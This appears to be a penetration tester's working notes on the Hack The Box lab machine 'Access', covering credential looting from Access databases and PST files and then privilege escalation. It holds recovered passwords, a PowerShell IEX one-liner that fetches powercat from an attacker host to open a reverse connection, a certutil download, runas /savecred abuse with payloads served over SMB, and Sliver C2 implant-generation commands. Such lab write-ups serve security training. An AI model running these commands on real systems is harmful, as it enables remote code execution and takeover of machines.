# Access Notes

## Data 

IP:  10.10.10.98
OS: Window server 2008 x64 
Hostname: Access
Machine Purpose: 
Services: 21,23,80 - LON-MC6! - no udp!
Service Languages: 
Users:  users.txt
Credentials: passwords.txt
```
access4u@security is password for 'Access Control.zip'
"security" - 4Cc3ssC0ntr0ller
john - john@megacorp.com
security@accesscontrolsystems.com
```



## Objectives


yawcam
2 directory exist
2diffs.png



## Solution Inventory Map



### Todo 


### Done

https://support.microsoft.com/en-us/topic/ms09-042-vulnerability-in-telnet-could-allow-remote-code-execution-7d71e702-0539-73ab-dbbe-2ac5502c8420 - no info, but it more a hint for our only point of connect, if I had waited I would seen it ask for credentials

dumpingftp.png
https://en.wikipedia.org/wiki/Microsoft_Access
Install [mbdtools](https://www.kali.org/tools/mdbtools/)
```bash
# mdbtools for mdb databse
# pstutils for the .pst file 
sudo apt install mdbtools pstutils
```

JET4.png
```bash
mdb-tables backup.mdb > all-tables
```

```bash
mdb-hexdump backup.mdb
```
afavouriteword.png
creds.png
3333s.png

access4u@security is password for 'Access Control.zip'

passwordaccountandversions.png

https://linux.die.net/man/1/readpst
```bash
readpst Access\ Control.pst
cat Access\ Control.mbox
```

John Carter is mentioned in USERINFO.c
johncarter.png

https://vulners.com/nessus/SMB_NT_MS09-042.NASL - trick a user or SSRF with telnet 

security-4Cc3ssC0ntr0ller.png

yawcam.png
https://packetstormsecurity.com/files/145770/Yawcam-0.6.0-Directory-Traversal.html

```powershell
%USER%.yawcam

type .yawcam\ver.dat
0.6.2
http://www.yawcam.com/ver.dat
http://home.bitcom.se/yawcam_files/ver.dat


```
https://www.yawcam.com/

systeminfo.png

Sad Netdogs and Netcats
netdogssaddogs.png

All executables are blocked by group policy

ZKTeco.png
```powershell
# Access denied - icacls you fool 
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.16/powercat.ps1');powercat -c 10.10.14.16 -p 8000 -i C:\ZKTeco\ZKAccess3.5"
# Icacls just because
icacls C:\ZKTeco\ZKAccess3.5
```

yawcam settings file 176.26.141.32:8080 is referenced
no172conn.png
```powershell
# Lead to nothing
certutil.exe -urlcache -split -f http://176.26.141.32:8080 wwwroot
```



https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-objects

WTF is LON-MC6 router?
yawcam is security camera - faq mentions port forwarding - but no binaries are aloud

alotsofperms.png
[exploitdb](https://www.exploit-db.com/exploits/40323) - we can basically modify because we can append, read and write data. I am happy I found this without searching for exploitdb. 

```
icalcs C:\ZKTeco\ZKAccess3.5
```

icaclzkaccessexes.png


But we cant modify dlls or write dll unless we can find phantom dlls that get loaded [hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)
dllhijackingtypes.png

WTF is LON-MC6 

telnet clients group

```powershell
# a backup of the primary Bootsect.dos created by old Windows OSs
C:\BOOTSECT.BAK
# 
C:\ZKTeco\ZKAccess3.5

But I had not found how Administrator would run in scheduled tasks, I would either need find a phantom dll by copying binaries and running them with procmon. 
```


https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/patched-microsoft-access-mdb-leaker-cve-2019-1463-exposes-sensitive-data-in-database-files

I decided that I need to comb the system like a dentist.
```powershell
# No Password in:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```


tasklistforntsystem.png

Unattended password trolling
pantherunatttendxmltroll.png

bingobangobongo.png

For some reason possible group policy I could not run this from a remote share. 
```powershell
# Start SMB share
# No password as we dont have powershell
impacket-smbserver Share $(pwd) -smb2support

cmdkey /list
runas /savecred /user:ACCESS\Administrator "\\10.10.14.16\Share\GIGANTIC_SCREEN.exe"
runas /savecred /user:ACCESS\Administrator "\\10.10.14.16\Share\RIGID_NANOPARTICLE.exe"
runas /savecred /user:ACCESS\Administrator

```
Because we can connect back we `runas`
hashcapturewithresponder.png

- Networking of yawcam
- Services
- cmd.exe is still running as Administrator

There is no [LGPO.exe](https://learn.microsoft.com/en-us/archive/blogs/secguide/lgpo-exe-local-group-policy-object-utility-v1-0) on Windows 2008

```powershell
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"
netsh firewall set portopening protocol = TCP port = 3389 name = "Remote Desktop Protocol" mode = ENABLE Ok
```

Considering the another troll of the cmdkey - [Runas](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)

I reran a nmap scan after discovering more ports. This machine is very trolly
ehports.png

I decided that Ghost dll and runas with cmdkey /list maybe it wanted to really specificly only run Access.exe as in the GPO that I cant access becase reason given previously and there is a whitelist. Then I could the transfer of Access.exe to work. 

revengineertears.png```
```
%PATH% 
```



But I had not found how Administrator would run in scheduled tasks, I would either need find a phantom dll by copying binaries and running them with procmon.  But it requires login https://www.zkteco.com/en/ZKAccess_3/ZKAccess3.5, which a rabbit hole indicator.

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#hosts-file bottom up reading

https://learn.microsoft.com/en-us/windows-server/identity/software-restriction-policies/administer-software-restriction-policies

Tried to add the 176.26.141.32 to the arp table, there is not curl or wget
notcoolenough.png

It is also not up
notup.png

And there is no yawcam process
noyawcamprocess.png

There was also a no cmd.exe from system today...
therewassystemcmdbutnoanymore.png

I went to forum for a hint - but it is just use runas, which I knew so I not doing to downgrade this.

whynotsliver.png

Now knowing that msfvenom works.. But sliver works from C:\temp and I am sure I tried that already...

cat.png

## Beyond Root

I feel in love with sliver from the silly names of implants to clarity and speed.
[Sliver Wiki](https://github.com/BishopFox/sliver/wiki/)
```go
sliver
// View all implants
implants
// Generate Beacons and Sessions
generate
// Choice one C2 endpoint using:
// --wg is wireguard 
--mtls --wg --http --dns
// Session are sessions opsec unsafe
generate --mtls domain.com --os windows --save 
// Beacons are asychronous - more opsec way they sleep and check 
generate beacon --mtls 10.10.10.10:6969 --arch amd64 --os windows -save /path/to/directory
// Regenerate
regenerate
// listeners
// Do not accept interfaces as arguemnts like metasploit
mtls
wg
https
http
dns
// Jonbs to view and manage listners
jobs
// Interact with sessions
use sessionID 
```

https://freshman.tech/snippets/go/cross-compile-go-programs/

https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/

